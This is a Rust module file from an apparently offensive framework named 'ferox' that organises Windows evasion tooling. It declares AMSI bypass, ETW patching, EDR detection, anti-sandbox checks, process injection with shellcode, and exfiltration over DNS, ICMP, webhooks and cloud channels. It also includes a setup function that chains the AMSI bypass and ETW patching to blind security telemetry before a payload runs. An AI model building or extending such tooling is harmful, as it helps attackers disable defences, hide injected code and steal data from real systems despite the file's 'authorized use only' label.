//! OPSEC (Operational Security) Module
//!
//! Provides comprehensive stealth capabilities for evading security controls:
//!
//! ## Modules
//!
//! - **engine**: Core OPSEC engine with traffic shaping, EDR detection, LOLBins
//! - **amsi_bypass**: Windows AMSI bypass techniques (T1562.001)
//! - **etw_patcher**: Windows ETW patching for telemetry evasion (T1562.006)
//! - **windows_internals**: Low-level Windows API helpers
//! - **edr_signatures**: EDR product signatures database (T1518.001)
//! - **edr_detector**: EDR detection engine with multiple scan depths
//! - **edr_adaptor**: Auto-adaptation based on detected EDR
//! - **memory_evasion**: Memory forensics evasion (T1055.012, T1027)
//! - **thread_hider**: Thread hiding techniques
//! - **pe_manipulator**: PE header manipulation
//! - **vm_signatures**: VM detection signatures (T1497)
//! - **sandbox_signatures**: Sandbox detection signatures (T1497)
//! - **timing_checks**: Timing-based evasion detection (T1497.003)
//! - **env_detector**: Environment detection engine (T1497)
//! - **target_process**: Target process selection for injection (T1055)
//! - **injection_techniques**: Process injection technique implementations (T1055.x)
//! - **process_injection**: High-level injection orchestration (T1055)
//! - **data_encoder**: Data encoding and chunking for exfiltration (T1048)
//! - **exfil_channels**: Exfiltration channel implementations (T1048.x)
//! - **exfil_engine**: High-level exfiltration orchestration (T1048)
//!
//! ## MITRE ATT&CK Coverage
//!
//! - T1518.001: Security Software Discovery
//! - T1562.001: Disable or Modify Tools (AMSI)
//! - T1562.006: Indicator Blocking (ETW)
//! - T1055.012: Process Hollowing
//! - T1070: Indicator Removal
//! - T1027: Obfuscation
//! - T1497: Virtualization/Sandbox Evasion
//! - T1036: Masquerading (LOLBins)
//! - T1055: Process Injection (multiple sub-techniques)
//! - T1048: Exfiltration Over Alternative Protocol
//!
//! ## Usage Example
//!
//! ```rust,ignore
//! use ferox::modules::evasion::opsec::{
//!     OpsecEngine, OpsecConfig, StealthLevel,
//!     AmsiBypass, AmsiBypassTechnique,
//!     EtwPatcher, EtwProvider,
//!     EdrDetector, EdrAdaptor, ScanDepth,
//!     MemoryEvasion, ThreadHider, PeManipulator,
//!     EnvironmentDetector, VmType, SandboxType,
//! };
//!
//! // Create OPSEC engine with ghost mode
//! let engine = OpsecEngine::new(OpsecConfig::ghost(), Platform::Windows);
//!
//! // Bypass AMSI before payload execution
//! let mut amsi = AmsiBypass::new(AmsiBypassTechnique::PatchScanBuffer);
//! let result = amsi.execute();
//!
//! // Patch ETW to prevent telemetry
//! let mut etw = EtwPatcher::new();
//! let result = etw.patch_all();
//! ```
//!
//! **SECURITY NOTICE**: AUTHORIZED USE ONLY

// Core OPSEC engine (existing code)
pub mod engine;

// Windows-specific evasion modules (Phase 1)
pub mod amsi_bypass;
pub mod etw_patcher;
pub mod windows_internals;

// EDR detection and adaptation (Phase 2)
pub mod edr_adaptor;
pub mod edr_detector;
pub mod edr_signatures;

// Memory forensics evasion (Phase 3)
pub mod memory_evasion;
pub mod pe_manipulator;
pub mod thread_hider;

// Anti-VM / Anti-Sandbox detection (Phase 4)
pub mod env_detector;
pub mod sandbox_signatures;
pub mod timing_checks;
pub mod vm_signatures;

// Process Injection (Phase 5)
pub mod injection_techniques;
pub mod process_injection;
pub mod target_process;

// Covert Data Exfiltration (Phase 6)
pub mod data_encoder;
pub mod exfil_channels;
pub mod exfil_engine;

// Re-export core engine types
pub use engine::{
    DefaultTrafficShaper, EdrDetectionResult, EdrDetector, EdrSignature, EdrType, LogEvasion,
    LolbinExecutor, LolbinMapping, MonitoredAction, NetworkNoise, OpsecConfig, OpsecDecision,
    OpsecEngine, OpsecReport, StealthLevel, TrafficShaper, UserSimulator, WorkingHours,
};

// Re-export AMSI bypass types
pub use amsi_bypass::{AmsiBypass, AmsiBypassResult, AmsiBypassTechnique, AmsiReference};

// Re-export ETW patcher types
pub use etw_patcher::{EtwPatchResult, EtwPatchTechnique, EtwPatcher, EtwProvider, EtwReference};

// Re-export Windows internals types
pub use windows_internals::{patches, PatchInfo, WinError, WinResult};

// Re-export EDR signatures types (Phase 2)
pub use edr_signatures::{
    DetectionMethod as EdrDetectionMethod, EdrSignature as EdrProductSignature,
    EdrType as EdrProductType,
};

// Re-export EDR detector types (Phase 2)
pub use edr_detector::{
    DetectedEdr, EdrDetectionResult as EdrScanResult, EdrDetector as EdrScanner, ScanDepth,
};

// Re-export EDR adaptor types (Phase 2)
pub use edr_adaptor::{AdaptedOpsecConfig, AdaptedStealthLevel, EdrAdaptor};

// Re-export Memory evasion types (Phase 3)
pub use memory_evasion::{
    EncryptedHeap, MemoryEvasion, MemoryEvasionResult, MemoryEvasionStatus,
    MemoryEvasionTechnique, MemoryRegion, MemoryRegionType,
};
pub use pe_manipulator::{PeManipResult, PeManipulator, PeOperation, PeSection};
pub use thread_hider::{ThreadHideResult, ThreadHideTechnique, ThreadHider};

// Re-export Anti-VM / Anti-Sandbox types (Phase 4)
pub use env_detector::{DetectionSensitivity, EnvironmentDetector, EnvironmentReport};
pub use sandbox_signatures::{
    get_sandbox_signatures, AnalysisArtifacts, SandboxSignature, SandboxType,
};
pub use timing_checks::{TimingCheckResult, TimingChecker};
pub use vm_signatures::{get_vm_signatures, VmSignature, VmType};

// Re-export Process Injection types (Phase 5)
pub use injection_techniques::{
    InjectionMethods, InjectionResult, InjectionTechnique, Shellcode,
};
pub use process_injection::{InjectionConfig, ProcessInjector, TechniqueInfo};
pub use target_process::{
    InjectionTargets, IntegrityLevel, ProcessFinder, ProcessSelectionCriteria, TargetProcess,
};

// Re-export Data Exfiltration types (Phase 6)
pub use data_encoder::{
    CompressionMethod, DataChunk, DataEncoder, EncodingMethod, EncryptionMethod,
};
pub use exfil_channels::{
    ChannelConfig, CloudExfil, CloudProvider, DnsExfil, ExfilChannel, ExfilResult, HttpsExfil,
    IcmpExfil, WebhookExfil, WebhookPlatform,
};
pub use exfil_engine::{ChannelInfo, ExfilConfig, ExfilEngine, ExfilSession, ExfilStatus};

// ============================================================================
// Integrated OPSEC Operations
// ============================================================================

use crate::core::module::Platform;

/// Comprehensive OPSEC setup result
#[derive(Debug, Clone)]
pub struct OpsecSetupResult {
    /// AMSI bypass result (Windows only)
    pub amsi_result: Option<AmsiBypassResult>,
    /// ETW patch result (Windows only)
    pub etw_result: Option<EtwPatchResult>,
    /// EDR detection result
    pub edr_result: Option<EdrDetectionResult>,
    /// Overall success
    pub success: bool,
    /// Summary message
    pub message: String,
}

/// Perform full OPSEC setup for Windows targets
///
/// This function:
/// 1. Detects installed EDR/AV
/// 2. Bypasses AMSI
/// 3. Patches ETW
/// 4. Returns comprehensive results
pub async fn setup_windows_opsec(
    config: &OpsecConfig,
    safe_mode: bool,
) -> OpsecSetupResult {
    let mut results = OpsecSetupResult {
        amsi_result: None,
        etw_result: None,
        edr_result: None,
        success: false,
        message: String::new(),
    };

    // Step 1: EDR Detection
    let edr_detector = EdrDetector::new();
    match edr_detector.detect(safe_mode).await {
        Ok(edr_result) => {
            results.edr_result = Some(edr_result);
        }
        Err(e) => {
            results.message = format!("EDR detection failed: {}", e);
        }
    }

    // Step 2: AMSI Bypass (if enabled)
    if config.amsi_bypass {
        let mut amsi = AmsiBypass::default();
        let amsi_result = amsi.execute();
        results.amsi_result = Some(amsi_result);
    }

    // Step 3: ETW Patching (if enabled)
    if config.etw_patch {
        let mut etw = EtwPatcher::new();
        let etw_result = etw.patch_all();
        results.etw_result = Some(etw_result);
    }

    // Determine overall success
    let amsi_ok = results
        .amsi_result
        .as_ref()
        .map(|r| r.success)
        .unwrap_or(true);
    let etw_ok = results
        .etw_result
        .as_ref()
        .map(|r| r.success)
        .unwrap_or(true);

    results.success = amsi_ok && etw_ok;
    results.message = if results.success {
        "OPSEC setup complete".to_string()
    } else {
        let mut failures = vec![];
        if !amsi_ok {
            failures.push("AMSI");
        }
        if !etw_ok {
            failures.push("ETW");
        }
        format!("OPSEC setup partial - failed: {}", failures.join(", "))
    };

    results
}

/// Quick OPSEC check - returns recommended configuration
pub async fn check_opsec_requirements(platform: Platform, safe_mode: bool) -> OpsecConfig {
    if platform != Platform::Windows {
        return OpsecConfig::quiet();
    }

    let edr_detector = EdrDetector::new();
    match edr_detector.detect(safe_mode).await {
        Ok(result) => result.recommended_config,
        Err(_) => OpsecConfig::quiet(),
    }
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_exports() {
        // Verify all expected types are exported
        let _config = OpsecConfig::default();
        let _level = StealthLevel::Ghost;
        let _technique = AmsiBypassTechnique::PatchScanBuffer;
        let _provider = EtwProvider::PowerShell;
    }

    #[test]
    fn test_opsec_config_presets() {
        let ghost = OpsecConfig::ghost();
        assert!(ghost.amsi_bypass);
        assert!(ghost.etw_patch);
        assert!(ghost.memory_only);

        let normal = OpsecConfig::normal();
        assert!(!normal.amsi_bypass);
        assert!(!normal.etw_patch);
    }

    #[tokio::test]
    async fn test_opsec_setup_safe_mode() {
        let config = OpsecConfig::quiet();
        let result = setup_windows_opsec(&config, true).await;

        // In safe mode on non-Windows, should still return a result
        assert!(result.message.len() > 0);
    }

    #[tokio::test]
    async fn test_check_opsec_requirements() {
        let config = check_opsec_requirements(Platform::Linux, true).await;
        assert_eq!(config.stealth_level, StealthLevel::Quiet);
    }
}
